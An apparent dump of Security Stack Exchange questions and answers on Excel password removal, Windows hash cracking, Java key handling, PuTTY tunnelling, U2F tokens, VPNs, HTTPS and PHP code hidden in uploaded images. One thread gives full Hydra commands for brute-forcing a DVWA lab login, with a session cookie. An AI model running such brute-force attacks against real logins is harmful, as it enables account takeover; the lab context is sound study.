<li><p><a href=""http://www.tradecommissioner.gc.ca/eng/document.jsp?did=76359"">Canadian Trade Commissioner Service: Domain name registration in China</a></p></li>
<li><p><a href=""http://www.scamwatch.gov.au/content/index.phtml/itemId/1022165"">SCAMWatch (Australian Competition &amp; Consumer Commission): Think carefully about unsolicited offers to register domain names overseas</a></p></li>
</ul>

<p>I can only post two links, but you'll find a bunch more if you do a Google search for ""Chinese domain scam"" or something of the sort. It's widely attested.</p>
","56304"
"Remove Password Protection from XLS Document","37687","","<p>Similar to what is listed here, <a href=""http://datapigtechnologies.com/blog/index.php/hack-into-a-protected-excel-2007-or-2010-workbook/"" rel=""nofollow"">http://datapigtechnologies.com/blog/index.php/hack-into-a-protected-excel-2007-or-2010-workbook/</a>, is there a way to remove the password from an XLS (Excel 2003) document?  Note that I am not asking for ways in which to crack or brute-force the password.  I know that Excel 2003 uses RC4 for the encryption scheme.  However, it does not store files in the same zip like structure that 2007 and 2010 does.</p>

<p>Additional Updates:  This is for a forgotten ""File Open"" and not VBA password.  I would be happy to hex edit the file too if I could find the specifications for where the password was stored.  An example used for VBA file removal is listed here, <a href=""http://gbanik.blogspot.co.uk/2010/08/understanding-excel-file-internals.html"" rel=""nofollow"">http://gbanik.blogspot.co.uk/2010/08/understanding-excel-file-internals.html</a>, and this is something sort of like what I am looking for except for the ""File Open"" password.</p>
","<p>See <a href=""http://auntitled.blogspot.fr/2010/12/excel-rc4-encryption-algorithm.html"">this blog post</a> which links to <a href=""http://msdn.microsoft.com/en-us/library/dd907466%28v=office.12%29"">the official documentation</a>. As the blog post explains, it seems that the encryption uses RC4 with a 128-bit key which is derived form the password; BUT (and that's the important point) the derivation truncates the unknown values at some point, down to 40 bits (see <a href=""http://msdn.microsoft.com/en-us/library/dd920360%28v=office.12%29"">section 2.3.6.2</a>). So, for a given document (using the salts and other values which are in the document header), there are only <em>2<sup>40</sup></em> possible RC4 keys, and that's workable with a PC in a fortnight (the blog post states that it could be lowered to ""a few minutes"" with GPUs, which is a bit exaggerated and unsubstantiated, especially since RC4 does not map well on GPU).</p>

<p>The challenge is finding software which does the exploration, from sources which are sufficiently respectable-looking that you would not fear running it on your PC. The other solution is programming it yourself.</p>

<p>(I had begun something like that at some point, but the file owner suddenly remembered the password and my effort stopped. So I quite believe that it is doable, and not very hard, but I have no code to show.)</p>
","19520"
"Windows 7 Password Hash Security","37643","","<p>I recently came across a <a href=""http://elliottback.com/wp/cracking-windows-passwords-with-ophcrack-and-rainbow-tables/"">number</a> <a href=""http://www.windowsecurity.com/articles/how-cracked-windows-password-part1.html"">of</a> <a href=""http://securityxploded.com/rainbowcrack.php"">sources</a> that suggest that cracking Windows user account passwords is easy by examining their password hashes.</p>

<p>I understand that these hashes are stored in the <a href=""http://en.wikipedia.org/wiki/Security_Accounts_Manager"">SAM</a> file in two formats: <a href=""http://en.wikipedia.org/wiki/LM_hash"">LM</a> and <a href=""http://en.wikipedia.org/wiki/NTLM"">NTLM</a>.  LM is unsecure (and since Vista, a meaningful one isn't stored, right?).  However, NTLM is also cryptographically weak, and can also be broken disturbingly quickly.  </p>

<p>In any case, even with what I would consider ""strong"" passwords, I have seen them cracked in a matter of a few minutes--simply by rebooting the computer into Linux from a flash drive, and then running a program that extracts passwords from the hashes.  This seems to me to be a huge vulnerability.</p>

<p>About the only thing I was able to find online about preventing this was to use a longer password, so as to guarantee that the weaker LM hash isn't meaningful--but NTLM is still weak.</p>

<p>Anyone know how to protect against these sort of attacks?</p>
","<p>There’s a few things to consider here. Two algorithms have been used by Microsoft for the accounts database on windows systems:</p>

<p>LM (LAN Manager)</p>

<p>NTLM (NT LAN Manager)</p>

<p>An attacker with physical access to your system can pretty easily dump the contents of the SAM (Security Accounts Manager) database for all local accounts and then use something like Ophcrack (<a href=""http://ophcrack.sourceforge.net"" rel=""nofollow"">http://ophcrack.sourceforge.net</a> ) to run rainbow table attacks against the hashed values. </p>

<p>However, you need determine what the actual risk is: the attacker is able to crack the password and/or the attacker is able to access the system. This is important because it’s not necessary to crack the password (guess it’s value) in order to compromise the system. Many other tools simply replace the hash in the SAM database with something chosen by the attacker. This compromises the system, but not necessarily the password itself. 
Whole disk encryption solves both problems as a first line of defense: your attacker is unable to mount the volume in whatever tool they’re using to muck around in the SAM database. If you go this route a lot of commercial vendors offer solutions. Truecrypt (<a href=""http://www.truecrypt.org/"" rel=""nofollow"">http://www.truecrypt.org/</a>) offers a superb free program. Bitlocker or any OS-integrated encryption solution is pretty much worthless since they are readily susceptible to cold boot attacks. </p>

<p>One of the newer solutions are self-encrypting drives that require a boot into their own firmware for access.</p>
","17677"
"How to use OpenSSL generated keys in Java?","37408","","<p>I have my pair of Public and Private keys and my certificate. Those where created in OpenSSL (why? because I was asked to do it in OpenSSL).
  Now I want to use those things to make a Java app that uses digital signatures.
  How can I use my private and public keys to encrypt/decrypt info (and use the certificate to see if data is valid? What are the classes in java that allow me to do that?</p>

<p>My keys are in plain text something like this:</p>

<pre><code>-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDDuyg3h0VbP9iZ6RCxSU6x4WX4
anAwedMVUTqF0WHlvHl1Kiqa6N6TiUk23uXAVUX8RwLFjXWHlG0xwW7mGByA2mX9
5oPQpQFu8C70aMuUotGv87iiLi0UKCZV+9wS9rMdg5LHu1mMPilwgOO6MlyTxKem
-----END PUBLIC KEY-----
</code></pre>

<p><strong>UPDATE</strong></p>

<p>I made this code but still can't use the private key to sign a string.</p>

<pre><code>public void encryptHash(String hashToEncrypt, String pathOfKey, String Algorithm) {
    FileInputStream fis = null;
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    int len;

        File f = new File(pathOfKey);

        fis = new FileInputStream(pathOfKey);
        len = 0;
        while((len = fis.read()) != -1){
            baos.write(len);
        }

        KeyFactory kf = KeyFactory.getInstance(Algorithm); //Algorithm = ""RSA""
        KeySpec keySpec = new PKCS8EncodedKeySpec(baos.toByteArray());
        baos.close();
        PrivateKey privateKey = kf.generatePrivate(keySpec);  //Here's the exception thrown

        Signature rsaSigner = Signature.getInstance(""SHA1withRSA"");
        rsaSigner.initSign(privateKey);

        fis = new FileInputStream(hashToEncrypt);
        BufferedInputStream bis = new BufferedInputStream(fis);
        byte[] buffer = new byte[1024];
        len = 0;
        while((len = bis.read(buffer)) &gt;= 0){
            try {
                rsaSigner.update(buffer, 0, len);
            } catch (SignatureException ex) {
                Logger.getLogger(DataEncryptor.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
        bis.close();

        byte[] signature = rsaSigner.sign();

        System.out.println(new String(signature));
}
</code></pre>

<p>the exception I'm gettin' is</p>

<pre><code>dic 09, 2011 12:49:02 PM firmaelectronica.DataEncryptor encryptHash
Grave: null
java.security.spec.InvalidKeySpecException: java.security.InvalidKeyException: IOException : DER input, Integer tag error
    at sun.security.rsa.RSAKeyFactory.engineGeneratePrivate(RSAKeyFactory.java:217)
    at java.security.KeyFactory.generatePrivate(KeyFactory.java:372)
    at firmaelectronica.DataEncryptor.encryptHash(DataEncryptor.java:40)
    at firmaelectronica.FirmaElectronica.main(FirmaElectronica.java:39)
Caused by: java.security.InvalidKeyException: IOException : DER input, Integer tag error
    at sun.security.pkcs.PKCS8Key.decode(PKCS8Key.java:361)
    at sun.security.pkcs.PKCS8Key.decode(PKCS8Key.java:367)
    at sun.security.rsa.RSAPrivateCrtKeyImpl.&lt;init&gt;(RSAPrivateCrtKeyImpl.java:91)
    at sun.security.rsa.RSAPrivateCrtKeyImpl.newKey(RSAPrivateCrtKeyImpl.java:75)
    at sun.security.rsa.RSAKeyFactory.generatePrivate(RSAKeyFactory.java:316)
    at sun.security.rsa.RSAKeyFactory.engineGeneratePrivate(RSAKeyFactory.java:213)
    ... 3 more
</code></pre>
","<p>If you have a public key in this form (and not within a certificate), I'd recommend using <a href=""http://bouncycastle.org/"" rel=""nofollow noreferrer"">BouncyCastle</a>'s <code>PEMReader</code>. Its <code>readObject()</code> method can read a lot for formats: public keys, certificates, private keys (although you may need to use the method with a password)...</p>

<p>If you don't want to use BouncyCastle, you can read certificates using a <a href=""http://docs.oracle.com/javase/6/docs/api/java/security/cert/CertificateFactory.html"" rel=""nofollow noreferrer"">CertificateFactory</a> (see examples). With a certificate in PEM format in an InputStream:</p>

<pre><code>CertificateFactory cf = CertificateFactory.getInstance(""X.509"");
Certificate cert = cf.generateCertificate(inputStream);
</code></pre>

<p>For private keys, if your private key is a PKCS#8 structure in DER format, you can read it directly using <a href=""http://docs.oracle.com/javase/6/docs/api/java/security/spec/PKCS8EncodedKeySpec.html"" rel=""nofollow noreferrer"">PKCS8EncodedKeySpec</a>. For example:</p>

<pre><code>KeyFactory kf = KeyFactory.getInstance(""RSA"");
// Read privateKeyDerByteArray from DER file.
KeySpec keySpec = new PKCS8EncodedKeySpec(privateKeyDerByteArray);
PrivateKey key = kf.generatePrivate(keySpec);
</code></pre>

<p>You can convert your private key into PKCS#8 using <code>openssl pkcs8 -topk8</code> (remember <code>-outform DER</code>, you may also want to check the cipher suites as not all might be commonly supported by both Java and OpenSSL).</p>

<ul>
<li>From a keystore usage point of view:</li>
</ul>

<p>If you don't want to do much programming for handling the keys, to go between Java and OpenSSL, it's convenient to use the PKCS#12 format.</p>

<p>If the keys and certs you have produced with OpenSSL are not already in a p12 container:</p>

<pre><code>openssl pkcs12 -export -in cert.pem -inkey key.pem -out store.p12
</code></pre>

<p>In general, you can make use of the directly, using Java's ""<code>PKCS12</code>"" keystore type (instead of ""<code>JKS</code>"" by default).</p>

<p>If needed, you can convert this PKCS12 keystore into another format (e.g. JKS) using <code>keytool</code> (Java 6+):</p>

<pre><code>keytool -importkeystore -srckeystore store.p12 -srcstoretype PKCS12 \
     -destkeystore store.jks -deststoretype JKS
</code></pre>

<p>(Essentially, the opposite operation as the one described in <a href=""https://security.stackexchange.com/a/3795/2435"">this question</a>.)</p>

<p>Either way, whether from using <code>PEMReader</code> or by loading your key/cert from a <code>KeyStore</code>, you should be able to get instances of <a href=""http://docs.oracle.com/javase/6/docs/api/java/security/PrivateKey.html"" rel=""nofollow noreferrer""><code>PrivateKey</code></a> and <a href=""http://docs.oracle.com/javase/6/docs/api/java/security/cert/Certificate.html"" rel=""nofollow noreferrer""><code>Certificate</code></a> (or <a href=""http://docs.oracle.com/javase/6/docs/api/java/security/PublicKey.html"" rel=""nofollow noreferrer""><code>PublicKey</code></a> directly).</p>

<p>You can verify the signature of a <code>Certificate</code> has been done using by the private key matching a given public key using its <code>verify(PublicKey)</code> method.</p>

<p>With them, you can also use the <a href=""http://docs.oracle.com/javase/tutorial/security/apisign/index.html"" rel=""nofollow noreferrer"">digital signature API</a>. It's a more general API for any document signature, and I wouldn't necessarily verify a certificate signature with it (I'd rather use the certification path API for this, since it will also build the chain).</p>
","9601"
"How to run any application through a proxy with PUTTY?","37398","","<p>Maybe I did not search for it the right way but I could not find the solution. Maybe I am misinformed but if I understand correctly I could use PUTTY to run any Windows applications through a proxy even if it does not have that feature.</p>

<p>Let's say I want to run Skype through a proxy using PUTTY. (Yes, Skype is more advance it has it's own proxy settings, but let's say a little more obscured software does not have its proxy setting. But nonetheless, I can use PUTTY to run Skype through a proxy as well.)</p>

<p>So, I have localhost/127.0.0.1 and a proxy listening to port 1234 and what to do?</p>
","<p>PuTTY implements the <a href=""http://en.wikipedia.org/wiki/Secure_Shell"" rel=""noreferrer"">SSH protocol</a>. The SSH protocols allows for two main ways to do some ""proxying"": port tunnelling, and SOCKS.</p>

<p><strong>Port tunnelling</strong>: the SSH client (PuTTY) runs a local server, listening on some port on the client (by default, it will accept only connections from <code>localhost</code>, not from remote systems, so that's ""safe""). When an incoming connection to that server occurs, the client talks to the SSH server and makes it create a new connection, <em>from</em> the server machine <em>to</em> a configured remote host; and then the SSH client and server forward data bytes between the two connections and through the SSH tunnel.</p>

<p><a href=""https://howto.ccs.neu.edu/howto/windows/ssh-port-tunneling-with-putty/"" rel=""noreferrer"">This guide</a> shows how to setup such a tunnel. In the guide example, the local port is 8080, and the remote host-and-port is <code>www.ccs.neu.edu:80</code>. This means that when PuTTY is launched on machine <em>A</em> and connects (with SSH) to a machine <em>B</em>, any software <em>S</em> running on <em>A</em> and connecting to <code>localhost:8080</code> on <em>A</em> will trigger a new connection from <em>B</em> to <code>www.ccs.neu.edu:80</code>; what <em>S</em> writes onto its connection to <code>localhost:8080</code> will be tunnelled through SSH, and then, on <em>B</em>, written onto the connection which points to <code>www.ccs.neu.edu:80</code>. Traffic in the other direction is also forwarded.</p>

<p>The tricky point is to convince an application to connect to ""localhost"" instead of a normal, named server. Some applications can be configured easily; for others, you can play with the ""hosts"" file (on Windows, look for it in <code>C:\Windows\system32\drivers\etc\hosts</code>). With the example above, if one adds the following line to the ""hosts"" file:</p>

<pre><code>127.0.0.1     foobar.com
</code></pre>

<p>then when an application tries to connect to, say, URL <code>http://foobar.com:8080/blah.hml</code>, the port tunnel applies and the data, ultimately, will reach <code>www.ccs.neu.edu</code> on port 80.</p>

<p>This kind of tunnelling is clunky and not very flexible. You will run into the following problems:</p>

<ul>
<li>The ultimate destination is fixed, through configuration.</li>
<li>The ""hosts"" file acts at the name resolution level, it cannot do anything for connections which use application-specified IP addresses.</li>
<li>The ""hosts"" file is just for names, not for ports. If an application wants to connect to port <em>P</em>, then you will have to initialize your tunnel with the local port <em>P</em> and none other.</li>
<li>If you want to setup several tunnels, you will need to allocate several local ports. In case of port conflict, you might want to play with <em>several</em> local addresses, e.g. binding the local server on 127.0.0.2, 127.0.0.3... I have done that a lot on Linux, but I don't know if this will work well with Windows.</li>
<li>The <em>name</em> that the application sees may resurface in the protocol. For instance, if the application wants to talk to a HTTP URL like <code>http://foobar.com:8080/blah.html</code>, then, regardless of how well intercepted and tunnelled the connection is, the application <em>will</em> send through it a HTTP request header which says ""this is for <code>foobar.com</code>"". The target server may not like it, if its name is not <code>foobar.com</code>.</li>
</ul>

<p><strong>SOCKS</strong> is a protocol which tries to fix these issues. You get SOCKS by selecting the ""dynamic"" option in PuTTY. With SOCKS, things work like this:</p>

<ul>
<li>On machine <em>A</em> (the SSH client), PuTTY maintains a server on a given port (say, 5000) and expects clients to ""talk SOCKS"" (a specific protocol).</li>
<li>PuTTY is connected with SSH to machine <em>B</em> (the SSH server).</li>
<li>When an application connects to the SOCKS server on <em>A</em> (i.e. <code>localhost:5000</code>), it says to that server, as per the <a href=""http://en.wikipedia.org/wiki/SOCKS"" rel=""noreferrer"">SOCKS protocol</a>: ""hello, I want to talk to <code>foobar.com</code> on port 80"".</li>
<li>PuTTY then talks to <em>B</em>, through the tunnel, to tell it: ""this is the SOCKS module; we want a new connection to <code>foobar.com</code> on port 80"".</li>
<li>The SSH server on <em>B</em> opens a connection to <code>foobar.com</code> on port 80 (note: this implies that the resolution of the name <code>foobar.com</code> will uses <em>B</em>'s DNS).</li>
<li>The SSH client and the SSH server then forward data in both direction, between the application and the <code>foobar.com</code> server, the data being encrypted in the SSH tunnel between <em>A</em> and <em>B</em>.</li>
</ul>

<p>SOCKS is mightily fine and flexible, but it requires the application to be <em>aware</em> that it should ""talk SOCKS"" with the local SOCKS server. Web browsers can do that, but not all application are that configurable.</p>

<p>As @Adnan points out, there is a solution called <a href=""http://www.freecap.ru/eng/?p=whatis"" rel=""noreferrer"">FreeCap</a>. This software runs on the local machine (the SSH client), hooks into the OS, and intercepts connections from application to transparently forward them to a local SOCKS server. With this package (assuming that it works well -- I have not tried) <em>and</em> a PuTTY-powered SOCKS server, you will get the automatic proxying that you look for.</p>

<hr />

<p>Port tunnelling is for TCP only. SOCKS supports UDP, but it is unclear whether FreeCap will detect and redirect UDP packets. VoIP applications, in particular Skype, usually use UDP, and might not work well with FreeCap. Similarly, if an application is unaware of the presence of FreeCap + SOCKS, then, when it tries to connect to <code>foobar.com</code>, it will first use the <em>local</em> DNS, on the SSH client, to turn the name into an IP address; and then it will initiate a TCP connection that FreeCap picks up and SOCKSizes. If <em>A</em> and <em>B</em> don't see the same DNS (e.g. <em>B</em> has access to a local private network DNS that <em>A</em> cannot see), then some problems may occur. Also, this means that DNS requests will emanate from <em>A</em>: if the point of the proxying was to hide <em>A</em>'s IP address, then the DNS requests will leak it.</p>

<p>A full-fledged <a href=""http://openvpn.net/"" rel=""noreferrer"">VPN</a> solution will be more thorough: such VPN hook deeper in the system, to intercept all IP <em>packets</em>, which will include all UDP traffic, including DNS. OpenVPN uses SSL for the link between the local machine and the exit point; but you can use PuTTY's port tunnelling to wrap that SSL into SSH (that's overkill, but if you really want to use SSH, that's not necessarily a bad idea).</p>
","39906"
"How secure are the FIDO U2F tokens","37364","","<p>Google and Yubico just announced the availability of cryptographic security tokens following the FIDO U2F specification. Is this <em>just another 2FA option,</em> or is this significantly better than solutions such as SecureID and TOTP?</p>

<p>Specifically: </p>

<ul>
<li>In what way is U2F fundamentally different from OTP?</li>
<li>How does U2F affect the feasibility of phishing attacks in comparison to OTP systems?</li>
<li>How feasible are non-interactive attacks against U2F (e.g. brute-force, etc)?</li>
<li>Can I safely use a single U2F token with multiple independent services?</li>
<li>How does U2F stack up against other commercial offerings? Are there better solutions available?</li>
</ul>
","<p>The answers I've gotten have been good, but I wanted to provide a bit more depth, going specifically in to why the system exists at all, which should explain a bit more about what it's good for.</p>

<blockquote>
  <p><strong><em>Disclaimer:</strong> While I now work for Google, I knew nothing about this project at the time this answer was written. Everything reported here was gathered from public sources. This post is my own opinions and observations and commentary, and does not represent the opinions, views, or intentions of Google.</em></p>
  
  <p><em>Though it's worth pointing out that I've been using this and tinkering with it for quite some time now, and as someone who has dealt a lot with social engineering and account takeovers, I am disproportionately impressed with what has been accomplished here.</em> </p>
</blockquote>

<h2>Why something new was needed</h2>

<p>Think about this: Google deployed two-factor authentication a long time ago. This is a company that cares deeply about security, and theirs has been top notch. And while they were already using the best technology available, <strong>the additional security that U2F delivers above traditional 2-factor is so significant</strong> that it was worth the company's time and money to design, develop, deploy, and support a replacement system that they don't even themselves sell. Yes, it's a very socially-conscious move of them to go down this road, but it's not only about the community. Google also did it because they, themselves, need the security that U2F alone provides. A lot of people trust Google with their most precious information, and some in dangerous political environments even trust Google with their <em>lives</em>. Google needs the security to be able to deliver on that trust.</p>

<p><strong>It comes down to phishing.</strong> Phishing is a big deal. It's extremely common and <em>super effective</em>. For attacks against hardened targets, phishing and similar attacks are really an attacker's best bet, and they know it. And more importantly:</p>

<p><strong>Our phishing protection is laughable.</strong> We have two-factor auth, but the implementations offer little defense. Common systems such as SecurID, Google Authenticator, email, phone, and SMS loops -- all of these systems offer <em>no protection at all</em> against time-of-use phishing attacks. A one-time-password is still a password, and it can be disclosed to an attacker.</p>

<p>And this isn't just theoretical. We've seen these attacks actually carried out. Attackers do, in fact, capture second-factor responses sent to phishing sites and immediately play them on the real login page. <strong><em>This actually happens, right now.</em></strong></p>

<p>So say you're Google. You've deployed the best protections available and you can see that they're not sufficient. What do you do? Nobody else is solving this problem for you; you've got to figure it out.</p>

<h2>The solution is easy; Adoption is the real issue</h2>

<p>Creating a second-factor solution that can't be phished is surprisingly simple. All you have to do is involve the browser. In the case of U2F, the device creates a public/private key pair for each site and burns the site's identity into the ""Key Handle"" that the site is supposed to use to request authentication. Then, that site identity is verified by the browser each time before any authentication is attempted. The site identity can even be tied to a specific TLS public key. And since it's a challenge-response protocol, replay is not possible either. And if the server accidentally leaks your ""Key Handle"" in a database breach, it still doesn't affect your security or reveal your identity. <strong>Employing this device effectively eliminates phishing as a possibility</strong>, which is a big deal to a security-sensitive organization.</p>

<p>Neither the crypto nor its application is new. Both are well-understood and trusted. The technology was never the difficulty, the difficulty is adoption. But Google is one of only a small number of players in a position to overcome the barriers that typically hold solutions like this back. Since Google makes the most popular browser, they can make sure that it's compatible by default. Since they make the most popular mobile OS, they can make sure that it works as well. And since they run the most popular email service, they can make sure that this technology has a relevant use case.</p>

<h2>More Open than Necessary</h2>

<p>Of course Google could have leveraged that position to give themselves a competitive advantage in the market, but they didn't. And that's pretty cool. <strong>Everyone needs this level of protection</strong>, including Yahoo and Microsoft with their competing email offerings. What's cool is that it was designed so that even competitors can safely make it their own. Nothing about the technology is tied to Google -- even the hardware is completely usage-agnostic. </p>

<p>The system was designed with the assumption that you <em>wouldn't</em> use it just for Google. A key feature of the protocol is that at no point does the token ever identify <em>itself</em>. In fact the <a href=""https://fidoalliance.org/specifications/download"" rel=""noreferrer"">specifications</a> state that this design was chosen to prevent the possibility of creating a ""supercookie"" that could be used to track you between colluding services.</p>

<p>So you can get a single token and safely use it not only on Gmail, but also on any other service that supports U2F. This gives you a lot more reason to put down the money for one. And since Yubico <a href=""https://github.com/Yubico"" rel=""noreferrer"">published</a> reference implementations of the server software in PHP, Java, and Python, getting authentication up and running on your own server is safely within the reach of even small shops.</p>
","71704"
"Why does Hydra return 16 valid passwords when none are valid?","37196","","<p>I've been playing around with Hydra and <a href=""http://www.dvwa.co.uk/"">DVWA</a> and I've hit a bit of a snag - Hydra responds letting me know that the first 16 passwords in my password list are correct when none of them are.</p>

<p>I assume this is a syntax error, but I'm not sure if anyone has seen this before. I've followed several tutorials with no luck so I'm hoping someone where can help.</p>

<p>Syntax : </p>

<pre><code>hydra 192.168.88.196 -l admin -P /root/lower http-get-form ""/dvwa/vulnerabilities/brute/index.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Username and/or password incorrect.""
</code></pre>

<p>Output</p>

<pre><code>Hydra v7.3 (c)2012 by van Hauser/THC &amp; David Maciejak - for legal purposes only

Hydra (http://www.thc.org/thc-hydra) starting at 2013-06-05 22:30:51
[DATA] 16 tasks, 1 server, 815 login tries (l:1/p:815), ~50 tries per task
[DATA] attacking service http-get-form on port 80
[80][www-form] host: 192.168.88.196   login: admin   password: adrianna
[STATUS] attack finished for 192.168.88.196 (waiting for children to finish)
[80][www-form] host: 192.168.88.196   login: admin   password: adrian
[80][www-form] host: 192.168.88.196   login: admin   password: aerobics
[80][www-form] host: 192.168.88.196   login: admin   password: academic
[80][www-form] host: 192.168.88.196   login: admin   password: access
[80][www-form] host: 192.168.88.196   login: admin   password: abc
[80][www-form] host: 192.168.88.196   login: admin   password: admin
[80][www-form] host: 192.168.88.196   login: admin   password: academia
[80][www-form] host: 192.168.88.196   login: admin   password: albatross
[80][www-form] host: 192.168.88.196   login: admin   password: alex
[80][www-form] host: 192.168.88.196   login: admin   password: airplane
[80][www-form] host: 192.168.88.196   login: admin   password: albany
[80][www-form] host: 192.168.88.196   login: admin   password: ada
[80][www-form] host: 192.168.88.196   login: admin   password: aaa
[80][www-form] host: 192.168.88.196   login: admin   password: albert
[80][www-form] host: 192.168.88.196   login: admin   password: alexander
1 of 1 target successfuly completed, 16 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2013-06-05 22:30:51
</code></pre>

<p><strong>EDIT</strong></p>

<p>I was successful in brute forcing the admin credentials. Once I had authenticated to DVWA I needed to find the cookie information (easily done via your browser or Burp Suite). Once I had the cookie information I issued the following command which worked.</p>

<pre><code>hydra 192.168.88.196 -l admin -P /root/lower http-get-form ""/dvwa/vulnerabilities/brute/index.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Username and/or password incorrect.:H=Cookie: security;low;PHPSESSID=&lt;value for PHP SESSID cookie""
</code></pre>
","<p>Same problem happened to me when I was playing with DVWA. The reason is that you're trying to brute-force <code>YOUR_SERVER/dvwa/vulnerabilities/brute/index.php</code> which needs authentication. Try to visit that page in your browser and you'll be prompted to enter a username and a password (different form from the one you're trying to brute-force)</p>

<p>So while you're trying to brute-force this:<br />
<img src=""https://i.stack.imgur.com/woS9T.png"" alt=""hydra-brute-force""></p>

<p>Hydra is actually ""seeing"" this:<br />
<img src=""https://i.stack.imgur.com/WnWxt.png"" alt=""hydra-login""></p>

<p>On the second form you won't get the message <em>""Username and/or password incorrect.""</em>, which you told Hydra to use to differentiate between failed and successful logins. Hydra doesn't see that failed login message, so it's assuming that the login was successful.</p>

<p>So you need to login using a browser, get the session cookie (by default, <code>PHPSESSID</code>) , and feed it to Hydra, and <em>then</em> Hydra will be able to ""see"" the first form.</p>

<p>Supposedly, you can set the cookie in the HTTP headers in Hydra by doing <code>H=Cookie:NAME=VALUE</code> or pointing Hydra to a file which sets the cookie by doing <code>C=/path/to/file</code>. Unfortunately, non of these worked for me.</p>

<p>After getting frustrated, I ended up commenting Line: 5 (<code>dvwaPageStartup</code>) in the file <code>/dvwa/vulnerabilities/brute/index.php</code>, which allowed Hydra to see the actual vulnerable login form.</p>
","37029"
"Is it possible to execute a php script in an image file?","37176","","<p>I have an image upload php website. Users can upload images to my website. A user claims he can hack my website using an uploaded image.</p>

<p>I opened all the images that he uploaded to my server with notepad. The last line of one image is:</p>

<pre><code>Àpa@ ;
&lt;?php

echo ""test ok"";
?&gt;
</code></pre>

<p>Can he hack my website using this image? How do I prevent users from uploading images like this?</p>
","<p>Image uploads (any files in general) are very hard to make completely secure - especially in PHP, which provides many attack vectors.</p>

<p>If you, for example display the image by calling</p>

<pre><code>require($someImage);
</code></pre>

<p>and that image has PHP code inside (like the one you posted), it may be interpreted and executed as such.</p>

<p>My guess is, if he claims he's owned your site, he most probably has. The image you've provided in itself won't do anything except print ""test ok"", but that code could easily be exchanged for some that gives unauthorized (even completely unrestricted) access to your site and server.</p>

<p>To make sure the file uploaded to your site is in fact an image, re-process it using GD (or Imagick), and save the processed image. It's bad practice to save the original image, especially using the original file name, as this opens up for many other attacks (for example directory traversal and file overwriting).</p>

<p>More information: <a href=""https://www.owasp.org/index.php/Unrestricted_File_Upload"">https://www.owasp.org/index.php/Unrestricted_File_Upload</a></p>
","32969"
"Do VPNs provide sufficient protection over public wireless networks?","37053","","<p>I know that VPNs are the standard way to secure communication between a remote user and their primary network, but I've never felt entirely comfortable relying on them when using an open wireless network, like at a coffee shop or airport. Even though I know the connection is encrypted, the fact that it can easily be sniffed makes me too nervous to connect to any important systems.</p>

<p>Is that fear unfounded, or is it a good idea to avoid transmitting sensitive information over the air, even when it's encrypted?</p>

<p>I guess the bottom line is, would you feel comfortable logging into your bank's website from a coffee shop, as long as it was tunneled through a VPN? (For the sake of simplicity, assume that the VPN is properly configured, physical security isn't an issue, etc... the scope of this question is just the VPN's role).</p>
","<p>With due considerations to the recent developments in terms of PPTP based VPN connections that lead to compromise of data, usage of Wifi under a VPN is still highly secure for a number of reasons.</p>

<p>Firstly, if you're a casual user who's performing Internet Banking, the practical overhead of performing the exploit procedure and then the decryption of the captured data is quite significant. No local coffee shop hacker would do it, and professionals wouldn't be interested in spending his time on you. </p>

<p>If security is absolutely critical to your transactions then, there are a number of simple additions:</p>

<ul>
<li>Ensure that the VPN connection is at least an AES-256 with certificate authentication. Do the usual checks to ensure that the certificate is not compromised to a MiTM attack. Eg OpenVPN</li>
<li>Keep the sessions inside your VPN connection them self encrypted. ie. Don't use HTTP, use certified HTTPS, replace FTP by SFTP, etc.</li>
<li>VPNs are over-rated as per me. A good SSH tunnel configured properly works as a lower cost and light weight, easy to deploy solution for encryption. Plus you channel it through your rented server and if you have the need and resources you could for example, setup any custom modifications of the encryption procedure. I'm not encouraging obscurity, just saying you don't have to limit yourself to the current textbook compliance procedures and thus use infamous but more secure encryption techniques.</li>
</ul>

<p>My point being, for banking, the chances of an <strong>attacker being able to break through a VPN encryption</strong>, then say a SSH tunnel and then finally your HTTPS web page traffic is <strong>extremely improbable</strong>, even for highly confidential EOW data.</p>

<p>And even then, banking sessions generally last for a few minutes at max. Apart from certain broken information, <strong>there would be no way in any practical banking system with even basic security to use that in order to steal money from you or hack you.</strong></p>
","18052"
"Does SSL/TLS (https) hide the urls being accessed","36930","","<p>Suppose I type this in my browser</p>

<pre><code>https://www.mysite.com/getsecret?username=alice&amp;password=mysecret
</code></pre>

<p>and an attacker is watching all traffic from me to my ISP. </p>

<p>What information is protected by HTTPS? Is the URL revealed? Are the parameters of the get request revealed?</p>

<p>Also, does HTTPS provide integrity for the url? </p>

<p>I tried looking at various HTTPS articles and the TLS specification but was not able to figure this out. </p>

<p>[EDIT:] It is okay if only the server domain name is revealed. However, no part of <code>?username=alice&amp;password=mysecret</code> should be revealed. </p>
","<p>The <a href=""http://en.wikipedia.org/wiki/HTTP_Secure"">HTTPS</a> protocol is equivalent to using HTTP over an <a href=""http://en.wikipedia.org/Transport_Layer_Security"">SSL or TLS</a> connection (over TCP).</p>

<p>Thus, first a <a href=""http://en.wikipedia.org/wiki/Transmission_Control_Protocol"">TCP connection</a> (on port 443) is opened to the server. This is usually enough to reveal the server's host name (i.e. <code>www.mysite.com</code> in your case) to the attacker. The IP address is directly observed, and:</p>

<ol>
<li>you usually did an unencrypted DNS query before,</li>
<li>many HTTPS servers serve only one domain per IP address,</li>
<li>The server's certificate is sent in plain, and contains the server name (between multiple ones, maybe),</li>
<li>in newer TLS versions, there is the server name indication, by which the client indicates to the server which host name is wished, so the server can present the right certificate, if it has multiple ones. (This is done to be able to go away from 2.)</li>
</ol>

<p>Then a TLS handshake takes place. This includes negotiation of a cipher suite and then a key exchange. Assuming at least one of your browser and the server didn't include the <code>NONE</code> cipher in the accepted suites, everything following the key exchange is encrypted.</p>

<p>And assuming there is no successful man-in-the-middle attack (i.e. an attacker which does intercept the connection, and presents a forged server certificate which your browser accepts), the key exchange is secure and no eavesdropper can decrypt anything which is then sent between you and the server, and also no attacker can change any part of the content without this being noticed. This includes the URL and any other part of the HTTP request, as well as the response from the server.</p>

<p>Of course, as D.W. mentions, the length of both request (which contains not much more variable data than the URL, maybe some Cookies) and response can be seen from the encrypted data stream. This might subvert the secrecy, specially if there are only a small number of different resources on the server. Also any follow-up resource requests.</p>

<p>Your password in the URL (or any other part of the request) should still be secure, though - at most its length can be known.</p>
